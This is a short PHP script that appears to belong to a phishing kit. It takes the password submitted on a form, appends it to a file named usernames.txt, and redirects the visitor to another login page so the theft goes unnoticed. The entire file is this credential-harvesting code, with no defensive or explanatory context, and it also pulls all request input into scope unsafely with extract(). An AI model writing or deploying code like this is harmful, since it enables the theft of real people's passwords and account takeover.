<?php
extract($_REQUEST);
$file=fopen("usernames.txt","a");
fwrite($file,"Pass: ");
fwrite($file,$pass ."\n");
fclose($file);
header('Location:opt.login.php');

?>